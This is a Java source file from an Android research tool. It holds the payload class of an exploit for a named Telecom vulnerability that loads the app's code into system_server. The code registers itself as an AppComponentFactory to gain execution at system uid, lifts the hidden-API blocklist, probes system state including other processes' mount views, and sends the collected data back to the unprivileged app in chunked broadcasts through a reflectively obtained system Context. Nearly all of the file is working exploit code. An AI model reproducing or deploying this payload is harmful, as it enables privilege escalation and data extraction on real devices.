package dev.pixelksu.domainprobe;

import android.app.AppComponentFactory;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.system.Os;
import android.util.Log;

/**
 * The system_server domain, reached through CVE-2026-49881.
 *
 * A Telecom logic bug loads this app's code into system_server:
 * InCallController.serviceClassExists() calls createPackageContextAsUser(...,
 * CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY).getClassLoader() on any app
 * whose InCallService carries the CLASS_EXISTENCE_CHECK meta-data, and because
 * this app names this class as android:appComponentFactory, system_server runs
 * our code at uid 1000, u:r:system_server:s0 — via this class's static
 * initializer and via instantiateClassLoader(), which getClassLoader() calls.
 *
 * system_server may not load our native library (no execmem), so the probe here
 * is {@link JavaProbe}. Its result is sent two ways: to logcat under the
 * "domainprobe" tag, and — so the app itself can display it — back to the app as
 * a RESULT broadcast, using a system Context obtained reflectively (the same
 * process holds one). Everything is Throwable-guarded: a fault here would be a
 * system_server crash.
 */
public final class TelecomPayload extends AppComponentFactory {
    @Override
    public ClassLoader instantiateClassLoader(ClassLoader cl, ApplicationInfo aInfo) {
        fire("instantiateClassLoader");
        return super.instantiateClassLoader(cl, aInfo);
    }

    private static void fire(String via) {
        int uid;
        try { uid = Os.getuid(); } catch (Throwable t) { return; }
        if (uid != 1000) return;               // only the system_server load matters
        // serviceClassExists() calls this on Telecom's binder thread; the probe
        // reads ~all peers' mountinfo, which must NOT block that thread or the
        // call is torn down before it completes. Run it on our own thread.
        new Thread(() -> runProbe(via), "domainprobe-ss").start();
    }

    private static void runProbe(String via) {
        String rows, content;
        // system_server cannot load our JNI library (no execmem) and cannot exec
        // the CLI, so the probe here is the pure-Java mirror. It emits the SAME row
        // set as the native probe -- rows Java cannot express carry an explicit
        // "n/a (native-only ...)" verdict -- so the six domains share one denominator.
        // Lift the hidden-API blocklist for our (app-classloader) code inside
        // system_server, so JavaProbe can reach hidden libcore.io.Os wrappers
        // (setxattr, prctl, ioctlInt, mmap/mprotect, ...) that raw reflection is
        // otherwise filtered from. Pure-Java, no native code (system_server has
        // no execmem). Guarded: on failure the probe still runs with its
        // per-method meta-reflection fallback.
        String bypass;
        try {
            org.lsposed.hiddenapibypass.HiddenApiBypass.addHiddenApiExemptions("");
            bypass = "hidden-API blocklist lifted";
        } catch (Throwable t) {
            bypass = "hidden-API bypass failed: " + t.getClass().getSimpleName();
        }
        try { Log.i(Report.TAG, "system_server: " + bypass); } catch (Throwable ignored) {}
        try {
            rows = JavaProbe.run();          // cheap row summaries
            content = JavaProbe.allContent(); // full per-row content (may be multi-MB)
        } catch (Throwable t) {
            try { Log.e(Report.TAG, "system_server probe error", t); } catch (Throwable ignored) {}
            return;
        }
        Log.i(Report.TAG, "=== system_server domain (via CVE-2026-49881, " + via + ") ===");
        for (String line : rows.split("\n")) Log.i(Report.TAG, line);
        Log.i(Report.TAG, "=== system_server domain end ===");
        Log.i(Report.TAG, "system_server: probe done (rows=" + rows.length()
                + "B content=" + content.length() + "B); sending result to app");
        sendBack(rows + content);
    }

    /** Hand the result to the app. The peer mount views make this multi-MB, but a
     *  single Binder transaction (a broadcast included) is capped near 1MB -- so we
     *  page it: several ordered broadcasts carrying (seq, total, slice), which the
     *  app reassembles. system_server holds a system Context reached reflectively. */
    private static void sendBack(String out) {
        String pkg = "dev.pixelksu.domainprobe";
        // Small slices, and paced: async broadcasts pile up in system_server's
        // outgoing Binder buffer, and even a few 256KB ones in flight overflow the
        // ~1MB async pool -- which makes AMS kill the receiver. Send one at a time
        // with a gap so each is delivered and drained before the next.
        final int CHUNK = 96 * 1024;
        Context sys = null;
        Throwable ctxErr = null;
        for (int i = 0; i < 8 && sys == null; i++) {
            try { sys = systemContext(); } catch (Throwable t) { ctxErr = t; }
            if (sys == null) try { Thread.sleep(120); } catch (InterruptedException e) { return; }
        }
        if (sys == null) {
            Log.w(Report.TAG, "sendBack: no system Context"
                    + (ctxErr != null ? " (" + ctxErr.getClass().getSimpleName() + ": " + ctxErr.getMessage() + ")" : "")
                    + " -- result is in logcat only");
            return;
        }
        Log.i(Report.TAG, "sendBack: system Context " + sys.getClass().getName());

        int total = Math.max(1, (out.length() + CHUNK - 1) / CHUNK);
        int sent = 0;
        for (int seq = 0; seq < total; seq++) {
            int from = seq * CHUNK, to = Math.min(out.length(), from + CHUNK);
            String slice = out.substring(from, to);
            Intent it = new Intent(pkg + ".RESULT").setPackage(pkg)
                    .putExtra("domain", "system_server")
                    .putExtra("seq", seq).putExtra("total", total).putExtra("data", slice);
            if (broadcast(sys, it, seq, total)) sent++;
            try { Thread.sleep(200); } catch (InterruptedException e) { return; }   // let the buffer drain
        }
        Log.i(Report.TAG, "sendBack: delivered " + sent + "/" + total + " slices to " + pkg);
    }

    /** Send one RESULT slice from system_server, trying the delivery methods that
     *  can work from that process (plain sendBroadcast throws "without a
     *  qualified user"; sending as our own user or ALL users is what works).
     *  Every attempt is logged so the working path (and any failure) is visible
     *  instead of silently swallowed. Returns true on the first success. */
    private static boolean broadcast(Context sys, Intent it, int seq, int total) {
        // 1) as our own user (uid 1000 -> user 0)
        try { sys.sendBroadcastAsUser(it, android.os.Process.myUserHandle()); return true; }
        catch (Throwable a) {
            // 2) as UserHandle.ALL (system_server holds INTERACT_ACROSS_USERS)
            try {
                android.os.UserHandle all = (android.os.UserHandle)
                        android.os.UserHandle.class.getField("ALL").get(null);
                sys.sendBroadcastAsUser(it, all);
                return true;
            } catch (Throwable b) {
                // 3) plain sendBroadcast (last resort)
                try { sys.sendBroadcast(it); return true; }
                catch (Throwable c) {
                    Log.e(Report.TAG, "sendBack: slice " + seq + "/" + total + " failed all methods"
                            + " -- asUser=" + a.getClass().getSimpleName() + ":" + a.getMessage()
                            + " | ALL=" + b.getClass().getSimpleName() + ":" + b.getMessage()
                            + " | plain=" + c.getClass().getSimpleName() + ":" + c.getMessage());
                    return false;
                }
            }
        }
    }

    private static Context systemContext() throws Exception {
        Class<?> at = Class.forName("android.app.ActivityThread");
        Object thread = at.getMethod("currentActivityThread").invoke(null);
        try { Object c = at.getMethod("getSystemContext").invoke(thread); if (c != null) return (Context) c; }
        catch (Throwable ignored) {}
        try { Object c = at.getMethod("getApplication").invoke(thread); if (c != null) return (Context) c; }
        catch (Throwable ignored) {}
        return null;
    }
}
